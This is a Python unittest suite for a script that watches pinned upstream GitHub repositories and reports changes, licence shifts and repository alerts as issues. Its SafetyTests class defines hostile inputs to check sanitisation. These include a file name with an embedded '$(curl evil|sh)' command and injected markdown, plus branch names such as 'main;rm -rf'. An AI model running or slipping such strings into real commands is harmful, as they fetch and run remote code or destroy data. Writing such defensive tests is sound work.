"""The upstream watcher reports changes in issues and never touches upstream content."""
import json
import os
from pathlib import Path
import stat
import subprocess
import sys
import tempfile
import textwrap
import unittest

from test_tools import ROOT

# Classes run_tests.py runs as parallel processes; keep in step with the classes below.
SHARDS = ["ReportTests", "AlertTests", "LicenceTests", "IssueLifecycleTests", "SafetyTests", "ShippedTests"]

SCRIPT = ROOT/'scripts/upstream_watch.py'
PIN, HEAD, OTHER = 'a'*40, 'b'*40, 'c'*40
SLUG = 'acme/kit'

# Serves canned API answers from a JSON file and logs every call with its stdin.
FAKE_GH = textwrap.dedent(f'''\
    #!{sys.executable}
    import json, os, sys
    args = sys.argv[1:]
    state = json.load(open(os.environ['FAKE_GH_STATE']))
    with open(os.environ['FAKE_GH_LOG'], 'a') as log:
        stdin = sys.stdin.read() if '--body-file' in args else None
        log.write(json.dumps({{'args': args, 'stdin': stdin}}) + '\\n')
    if args[:2] == ['issue', 'list']:
        print(json.dumps(state['issues']))
    elif args[0] == 'api':
        answer = state['api'].get(args[1])
        if answer is None:
            sys.stderr.write('gh: Not Found (HTTP 404)\\n')
            sys.exit(1)
        if 'status' in answer:
            sys.stderr.write(f"gh: failed (HTTP {{answer['status']}})\\n")
            sys.exit(1)
        print(json.dumps(answer['json']))
    ''')


def tree(*entries):
    return {'json': {'tree': [{'path': path, 'type': kind, 'sha': sha} for path, kind, sha in entries]}}


def api(**extra):
    """A repository with a pin one commit behind, where `skills/kit` changed."""
    answers = {
        f'repos/{SLUG}': {'json': {'full_name': SLUG, 'default_branch': 'main', 'archived': False,
                                   'license': {'spdx_id': 'MIT'}}},
        f'repos/{SLUG}/git/ref/heads/main': {'json': {'object': {'sha': HEAD}}},
        f'repos/{SLUG}/compare/{PIN}...{HEAD}?per_page=1': {'json': {
            'status': 'ahead', 'ahead_by': 3, 'behind_by': 0, 'total_commits': 3,
            'files': [{'filename': 'skills/kit/guide.md', 'status': 'modified'},
                      {'filename': 'unrelated/file.md', 'status': 'added'}]}},
        f'repos/{SLUG}/git/trees/{PIN}': tree(('LICENSE', 'blob', 'l1'), ('skills', 'tree', 'skills-old')),
        f'repos/{SLUG}/git/trees/{HEAD}': tree(('LICENSE', 'blob', 'l1'), ('skills', 'tree', 'skills-new')),
        f'repos/{SLUG}/git/trees/skills-old': tree(('kit', 'tree', 'kit-old')),
        f'repos/{SLUG}/git/trees/skills-new': tree(('kit', 'tree', 'kit-new')),
        f'repos/{SLUG}/git/trees/kit-old': tree(('guide.md', 'blob', 'g1')),
        f'repos/{SLUG}/git/trees/kit-new': tree(('guide.md', 'blob', 'g2')),
    }
    answers.update(extra)
    return {key: value for key, value in answers.items() if value is not None}


def issue(body, state='OPEN', number=7, labels=('upstream-update',)):
    return {'number': number, 'state': state, 'body': body, 'labels': [{'name': name} for name in labels]}


class WatcherCase(unittest.TestCase):
    def setUp(self):
        self.temp = tempfile.TemporaryDirectory()
        self.addCleanup(self.temp.cleanup)
        base = Path(self.temp.name)
        self.root, self.state, self.log = base/'library', base/'state.json', base/'calls.log'
        fake = base/'bin/gh'
        fake.parent.mkdir()
        fake.write_text(FAKE_GH)
        fake.chmod(fake.stat().st_mode | stat.S_IEXEC)
        self.env = {**os.environ, 'PATH': f'{fake.parent}{os.pathsep}{os.environ["PATH"]}',
                    'FAKE_GH_STATE': str(self.state), 'FAKE_GH_LOG': str(self.log)}
        self.env.pop('GH_REPO', None)
        (self.root/'skills').mkdir(parents=True)
        self.provenance({'kit-skill': self.record()})

    def record(self, **extra):
        return {'source': f'https://github.com/{SLUG}/tree/{PIN}/skills/kit', 'revision': PIN, 'license': 'MIT', **extra}

    def provenance(self, skills):
        (self.root/'provenance.json').write_text(json.dumps({'skills': skills}))

    def run_watch(self, answers=None, issues=(), *flags):
        self.state.write_text(json.dumps({'api': api() if answers is None else answers, 'issues': list(issues)}))
        self.log.write_text('')
        return subprocess.run([sys.executable, '-B', str(SCRIPT), '--root', str(self.root), '--repo', 'orbyn/lib', *flags],
                              capture_output=True, text=True, env=self.env)

    def calls(self):
        return [json.loads(line) for line in self.log.read_text().splitlines()]

    def writes(self):
        return [call for call in self.calls() if call['args'][0] != 'api' and call['args'][:2] != ['issue', 'list']
                and call['args'][0] != 'label']

    def created_body(self):
        created = [call for call in self.calls() if call['args'][:2] == ['issue', 'create']]
        self.assertEqual(len(created), 1, self.calls())
        return created[0]['stdin'], created[0]['args']


class ReportTests(WatcherCase):
    def test_a_relevant_change_opens_one_issue_with_every_required_fact(self):
        result = self.run_watch()
        self.assertEqual(result.returncode, 0, result.stderr + result.stdout)
        body, args = self.created_body()
        self.assertTrue(body.startswith(f'<!-- upstream-watch:source={SLUG} -->\n'))
        for fact in (PIN, HEAD, 'kit-skill', 'skills/kit/guide.md', 'unchanged since the pin', 'Recorded MIT'):
            self.assertIn(fact, body)
        self.assertNotIn('unrelated/file.md', body)
        self.assertEqual(args[args.index('--label') + 1], 'upstream-update')
        self.assertNotIn('upstream-licence-change', args)

    def test_a_change_outside_what_we_use_is_quiet(self):
        answers = api(**{f'repos/{SLUG}/git/trees/{HEAD}': tree(('LICENSE', 'blob', 'l1'), ('skills', 'tree', 'skills-old'))})
        self.run_watch(answers)
        self.assertEqual(self.writes(), [])

    def test_a_pin_at_head_reads_no_compare(self):
        answers = api(**{f'repos/{SLUG}/git/ref/heads/main': {'json': {'object': {'sha': PIN}}}})
        self.run_watch(answers)
        self.assertEqual(self.writes(), [])
        self.assertFalse(any('compare' in call['args'][1] for call in self.calls() if call['args'][0] == 'api'))

    def test_a_truncated_compare_says_so_and_still_finds_the_skill(self):
        files = [{'filename': f'other/{index}.md', 'status': 'modified'} for index in range(300)]
        answers = api(**{f'repos/{SLUG}/compare/{PIN}...{HEAD}?per_page=1': {'json': {
            'status': 'ahead', 'ahead_by': 900, 'behind_by': 0, 'total_commits': 900, 'files': files}}})
        self.run_watch(answers)
        body, _ = self.created_body()
        self.assertIn('Compare truncated', body)
        self.assertIn('Changed for: kit-skill', body)

    def test_a_renamed_file_counts_on_its_old_path(self):
        answers = api(**{f'repos/{SLUG}/compare/{PIN}...{HEAD}?per_page=1': {'json': {
            'status': 'ahead', 'ahead_by': 1, 'behind_by': 0, 'total_commits': 1,
            'files': [{'filename': 'moved/guide.md', 'previous_filename': 'skills/kit/guide.md', 'status': 'renamed'}]}}})
        self.run_watch(answers)
        self.assertIn('moved/guide.md', self.created_body()[0])

    def test_a_path_missing_at_the_pin_counts_every_change_instead_of_none(self):
        self.provenance({'kit-skill': self.record(source=f'https://github.com/{SLUG}/tree/{PIN}/wrong/path')})
        self.run_watch()
        body, _ = self.created_body()
        self.assertIn('do not exist at the pin', body)
        self.assertIn('unrelated/file.md', body)

    def test_a_named_skill_file_brings_its_folder(self):
        self.provenance({'kit-skill': self.record(source=f'https://github.com/{SLUG}/blob/{PIN}/skills/kit/SKILL.md')})
        self.run_watch()
        self.assertIn('skills/kit/guide.md', self.created_body()[0])

    def test_a_tree_url_without_a_path_is_a_pin_on_the_whole_repository(self):
        self.provenance({'kit-skill': self.record(source=f'https://github.com/{SLUG}/tree/{PIN}')})
        self.run_watch()
        self.assertIn('unrelated/file.md', self.created_body()[0])

    def test_an_unreadable_pinned_source_fails_rather_than_being_skipped(self):
        self.provenance({'kit-skill': self.record(source='https://example.com/kit')})
        self.assertEqual(self.run_watch().returncode, 2)

    def test_records_without_a_revision_are_not_pins(self):
        self.provenance({'ours': {'source': 'https://github.com/orbyn/own/tree/main/skills/ours', 'license': 'MIT'}})
        self.assertEqual(self.run_watch().returncode, 0)
        self.assertFalse(any(call['args'][0] == 'api' for call in self.calls()))

    def test_snapshot_pins_use_the_source_root_and_skip_licences(self):
        folder = self.root/'skills/kit-skill/references/upstream/kit'
        folder.mkdir(parents=True)
        (folder/'snapshot.json').write_text(json.dumps({
            'repository': f'https://github.com/{SLUG}', 'revision': PIN, 'license': 'MIT', 'source_root': 'skills',
            'files': {'guide.md': {'source_path': 'kit/guide.md'}, 'LICENSE': {'source_path': 'kit/LICENSE'}}}))
        self.provenance({})
        self.run_watch()
        body, _ = self.created_body()
        self.assertIn('Paths we use that changed: `skills/kit/guide.md`', body)

    def test_later_reviewed_revisions_are_shown_but_are_not_pins(self):
        self.provenance({'kit-skill': self.record(reviewed_sources=[
            {'source': f'https://github.com/{SLUG}/tree/{OTHER}', 'revision': OTHER}])})
        self.run_watch()
        body, _ = self.created_body()
        self.assertIn(f'Reviewed without adopting, not pins: `{OTHER}`', body)
        self.assertNotIn(f'Pin `{OTHER}`', body)


class AlertTests(WatcherCase):
    def assert_alert(self, answers, text):
        self.run_watch(answers)
        self.assertIn(text, self.created_body()[0])

    def test_a_deleted_repository_is_reported_not_treated_as_quiet(self):
        self.assert_alert(api(**{f'repos/{SLUG}': None}), 'deleted or made private')

    def test_a_legal_block_is_reported(self):
        self.assert_alert(api(**{f'repos/{SLUG}': {'status': 451}}), 'legal reasons')

    def test_an_archived_repository_is_reported(self):
        repo = api()[f'repos/{SLUG}']['json']
        self.assert_alert(api(**{f'repos/{SLUG}': {'json': {**repo, 'archived': True}}}), 'archived')

    def test_a_rename_is_reported_and_followed(self):
        new = 'acme/renamed'
        answers = {key.replace(SLUG, new): value for key, value in api().items()}
        repo = answers.pop(f'repos/{new}')['json']
        answers[f'repos/{SLUG}'] = {'json': {**repo, 'full_name': new}}
        self.assert_alert(answers, 'renamed to `acme/renamed`')

    def test_a_case_change_is_not_a_rename(self):
        repo = api()[f'repos/{SLUG}']['json']
        answers = api(**{f'repos/{SLUG}': {'json': {**repo, 'full_name': 'Acme/Kit'}}})
        renamed = {key.replace(SLUG, 'Acme/Kit'): value for key, value in answers.items() if key != f'repos/{SLUG}'}
        self.run_watch({**renamed, f'repos/{SLUG}': answers[f'repos/{SLUG}']})
        self.assertNotIn('renamed', self.created_body()[0])

    def test_a_force_pushed_pin_is_reported(self):
        for status in ('diverged', 'behind'):
            answers = api(**{f'repos/{SLUG}/compare/{PIN}...{HEAD}?per_page=1': {'json': {
                'status': status, 'ahead_by': 2, 'behind_by': 4, 'total_commits': 2, 'files': []}}})
            self.assert_alert(answers, 'no longer reachable')

    def test_a_vanished_pin_is_reported(self):
        answers = api(**{f'repos/{SLUG}/compare/{PIN}...{HEAD}?per_page=1': None, f'repos/{SLUG}/git/trees/{PIN}': None})
        self.assert_alert(answers, 'no longer exists upstream')
        self.assertIn('Changed for: kit-skill', self.created_body()[0])


class LicenceTests(WatcherCase):
    def assert_loud(self, answers, text):
        self.run_watch(answers)
        body, args = self.created_body()
        self.assertIn('upstream-licence-change', args)
        self.assertIn(text, body)

    def head_tree(self, *entries):
        return {f'repos/{SLUG}/git/trees/{HEAD}': tree(*entries, ('skills', 'tree', 'skills-new'))}

    def test_edited_licence_text_is_loud_even_when_detection_agrees(self):
        self.assert_loud(api(**self.head_tree(('LICENSE', 'blob', 'l2'))), 'CHANGED')

    def test_a_removed_licence_is_loud(self):
        self.assert_loud(api(**self.head_tree()), 'CHANGED')

    def test_a_licence_change_is_loud_when_nothing_we_use_changed(self):
        answers = api(**{f'repos/{SLUG}/git/trees/{HEAD}': tree(('LICENSE', 'blob', 'l2'), ('skills', 'tree', 'skills-old'))})
        self.assert_loud(answers, 'CHANGED')

    def test_a_new_notice_in_our_folder_is_loud(self):
        answers = api(**{f'repos/{SLUG}/git/trees/kit-new': tree(('guide.md', 'blob', 'g2'), ('NOTICE.md', 'blob', 'n1'))})
        self.assert_loud(answers, 'NOTICE.md')

    def test_a_detected_copyleft_licence_is_loud_and_named_as_outside_our_rule(self):
        repo = api()[f'repos/{SLUG}']['json']
        answers = api(**{f'repos/{SLUG}': {'json': {**repo, 'license': {'spdx_id': 'AGPL-3.0'}}}},
                      **self.head_tree(('LICENSE', 'blob', 'l2')))
        self.assert_loud(answers, 'Not on our credit-only list')

    def test_a_licence_differing_from_our_record_is_loud(self):
        repo = api()[f'repos/{SLUG}']['json']
        self.assert_loud(api(**{f'repos/{SLUG}': {'json': {**repo, 'license': {'spdx_id': 'GPL-3.0'}}}}), 'DISPUTED')

    def test_a_licence_only_in_our_folder_is_compared_when_the_root_has_none(self):
        answers = api(**{f'repos/{SLUG}': {'json': {'full_name': SLUG, 'default_branch': 'main', 'license': None}},
                         f'repos/{SLUG}/git/trees/{PIN}': tree(('skills', 'tree', 'skills-old')),
                         f'repos/{SLUG}/git/trees/{HEAD}': tree(('skills', 'tree', 'skills-new')),
                         f'repos/{SLUG}/git/trees/kit-old': tree(('LICENSE', 'blob', 'l1'), ('guide.md', 'blob', 'g1')),
                         f'repos/{SLUG}/git/trees/kit-new': tree(('LICENSE', 'blob', 'l1'), ('guide.md', 'blob', 'g2'))})
        self.run_watch(answers)
        body, args = self.created_body()
        self.assertIn('unchanged since the pin', body)
        self.assertNotIn('upstream-licence-change', args)

    def test_a_code_file_named_like_a_licence_stays_quiet(self):
        answers = api(**{f'repos/{SLUG}/git/trees/kit-new': tree(('guide.md', 'blob', 'g2'), ('notice.ts', 'blob', 'n1'))})
        self.run_watch(answers)
        self.assertNotIn('upstream-licence-change', self.created_body()[1])


class IssueLifecycleTests(WatcherCase):
    def existing(self):
        self.run_watch()
        return self.created_body()[0]

    def test_a_second_run_edits_the_same_issue_instead_of_opening_another(self):
        body = self.existing()
        self.run_watch(api(), [issue(body.replace(PIN, PIN, 1) + 'stale')])
        self.assertEqual([call['args'][:3] for call in self.writes()], [['issue', 'edit', '7']])

    def test_an_identical_report_writes_nothing(self):
        self.run_watch(api(), [issue(self.existing())])
        self.assertEqual(self.writes(), [])

    def test_the_issue_closes_when_the_pin_catches_up(self):
        body = self.existing()
        self.run_watch(api(**{f'repos/{SLUG}/git/ref/heads/main': {'json': {'object': {'sha': PIN}}}}), [issue(body)])
        self.assertEqual([call['args'][:3] for call in self.writes()], [['issue', 'close', '7']])

    def test_a_maintainer_closing_an_issue_is_respected_until_something_new_happens(self):
        body = self.existing()
        self.run_watch(api(), [issue(body, state='CLOSED')])
        self.assertEqual(self.writes(), [])
        changed = api(**{f'repos/{SLUG}/git/trees/kit-new': tree(('guide.md', 'blob', 'g3'))})
        changed[f'repos/{SLUG}/compare/{PIN}...{HEAD}?per_page=1']['json']['files'].append(
            {'filename': 'skills/kit/new.md', 'status': 'added'})
        self.run_watch(changed, [issue(body, state='CLOSED')])
        self.assertEqual([call['args'][:2] for call in self.writes()], [['issue', 'reopen'], ['issue', 'edit']])

    def test_a_moving_head_with_nothing_relevant_does_not_reopen(self):
        body = self.existing()
        moved = {key.replace(HEAD, OTHER): value for key, value in api().items()}
        moved[f'repos/{SLUG}/git/ref/heads/main'] = {'json': {'object': {'sha': OTHER}}}
        self.run_watch(moved, [issue(body, state='CLOSED')])
        self.assertEqual(self.writes(), [])

    def test_the_licence_label_is_removed_when_the_problem_clears(self):
        body = self.existing()
        self.run_watch(api(), [issue(body, labels=('upstream-update', 'upstream-licence-change'))])
        self.assertEqual(self.writes()[0]['args'][3:], ['--repo', 'orbyn/lib', '--remove-label', 'upstream-licence-change'])

    def test_a_failed_call_leaves_the_issue_alone_and_fails_the_run(self):
        body = self.existing()
        for status in (403, 429, 500):
            result = self.run_watch(api(**{f'repos/{SLUG}': {'status': status}}), [issue(body)])
            self.assertEqual(result.returncode, 1, status)
            self.assertIn('UNVERIFIED', result.stdout)
            self.assertEqual(self.writes(), [])

    def test_a_source_we_stopped_pinning_closes(self):
        body = self.existing()
        self.provenance({})
        self.run_watch({}, [issue(body)])
        self.assertEqual([call['args'][:3] for call in self.writes()], [['issue', 'close', '7']])

    def test_an_issue_without_a_leading_marker_is_ignored(self):
        body = self.existing()
        self.run_watch(api(), [issue('hello\n' + body)])
        self.assertEqual([call['args'][:2] for call in self.writes()], [['issue', 'create']])

    def test_labels_exist_before_any_issue_uses_them(self):
        self.run_watch()
        names = [call['args'][2] for call in self.calls() if call['args'][0] == 'label']
        self.assertEqual(names, ['upstream-update', 'upstream-licence-change'])


class SafetyTests(WatcherCase):
    HOSTILE = 'skills/kit/@maintainer `$(curl evil|sh)` #1\n<!-- upstream-watch:source=x/y -->[a](https://evil)!.md'

    def hostile_answers(self):
        repo = api()[f'repos/{SLUG}']['json']
        return api(**{
            f'repos/{SLUG}': {'json': {**repo, 'license': {'spdx_id': 'MIT'}}},
            f'repos/{SLUG}/compare/{PIN}...{HEAD}?per_page=1': {'json': {
                'status': 'ahead', 'ahead_by': 1, 'behind_by': 0, 'total_commits': 1,
                'files': [{'filename': self.HOSTILE, 'status': 'modified'}]}}})

    def test_upstream_text_cannot_form_a_mention_reference_comment_or_span_escape(self):
        self.run_watch(self.hostile_answers())
        body, args = self.created_body()
        for text in ('@maintainer', '$(', '#1', '<!-- upstream-watch:source=x/y', 'https://evil'):
            self.assertNotIn(text, body)
        self.assertEqual(body.count('<!--'), 2)
        self.assertFalse(any('maintainer' in arg for arg in args))

    def test_upstream_text_travels_only_on_stdin(self):
        self.run_watch(self.hostile_answers())
        for call in self.writes():
            self.assertFalse(any('$(' in arg or '\n' in arg for arg in call['args']))

    def test_a_hostile_branch_name_is_never_sent_to_the_api(self):
        repo = api()[f'repos/{SLUG}']['json']
        for branch in ('../../user', 'main;rm -rf', 'a b', '{owner}'):
            result = self.run_watch(api(**{f'repos/{SLUG}': {'json': {**repo, 'default_branch': branch}}}))
            self.assertEqual(result.returncode, 1)
            self.assertFalse(any(branch in ' '.join(call['args']) for call in self.calls()))

    def test_a_malformed_head_is_refused(self):
        result = self.run_watch(api(**{f'repos/{SLUG}/git/ref/heads/main': {'json': {'object': {'sha': 'nope'}}}}))
        self.assertEqual(result.returncode, 1)
        self.assertEqual(self.writes(), [])

    def test_the_issue_stays_within_the_github_limit(self):
        files = [{'filename': f'skills/kit/{"x"*150}{index}.md', 'status': 'modified'} for index in range(5000)]
        answers = api(**{f'repos/{SLUG}/compare/{PIN}...{HEAD}?per_page=1': {'json': {
            'status': 'ahead', 'ahead_by': 1, 'behind_by': 0, 'total_commits': 1, 'files': files}}})
        self.run_watch(answers)
        self.assertLess(len(self.created_body()[0]), 65536)

    def test_a_dry_run_reads_but_never_writes(self):
        result = self.run_watch(api(), [], '--dry-run')
        self.assertEqual(result.returncode, 0)
        self.assertIn('would open', result.stdout)
        self.assertIn(HEAD, result.stdout)
        self.assertEqual(self.writes(), [])
        self.assertFalse(any(call['args'][0] == 'label' for call in self.calls()))

    def test_a_real_run_needs_a_repository(self):
        result = subprocess.run([sys.executable, '-B', str(SCRIPT), '--root', str(self.root)],
                                capture_output=True, text=True, env=self.env)
        self.assertEqual(result.returncode, 2)

    def test_only_read_calls_reach_the_api_and_no_pr_or_clone_is_attempted(self):
        self.run_watch(api(), [issue(self.body())])
        for call in self.calls():
            self.assertNotIn(call['args'][0], ('pr', 'repo', 'gist', 'release'))
            if call['args'][0] == 'api':
                self.assertEqual(len(call['args']), 2)
                self.assertNotRegex(call['args'][1], 'contents|tarball|zipball|blobs')

    def body(self):
        self.run_watch()
        return self.created_body()[0]


class ShippedTests(unittest.TestCase):
    def test_the_workflow_runs_from_main_with_least_privilege(self):
        text = (ROOT/'.github/workflows/upstream-watch.yml').read_text()
        self.assertIn("cron:", text)
        self.assertIn('workflow_dispatch:', text)
        self.assertIn('ref: main', text)
        self.assertIn("github.ref == 'refs/heads/main'", text)
        self.assertIn('persist-credentials: false', text)
        grants = {line.strip() for line in text.splitlines() if line.strip().endswith((': read', ': write'))}
        self.assertEqual(grants, {'contents: read', 'issues: write'})
        self.assertNotIn('pull_request', text)
        self.assertNotIn('${{ github.event', text)

    def test_every_snapshot_and_pinned_record_in_the_library_is_understood(self):
        result = subprocess.run([sys.executable, '-B', '-c', (
            'import sys, pathlib; sys.path.insert(0, "scripts"); import upstream_watch as u; '
            'pins = u.gather_pins(pathlib.Path(".")); print(len({p.slug for p in pins}))')],
            capture_output=True, text=True, cwd=ROOT)
        self.assertEqual(result.returncode, 0, result.stderr)
        self.assertGreaterEqual(int(result.stdout), 9)


if __name__ == '__main__':
    unittest.main()
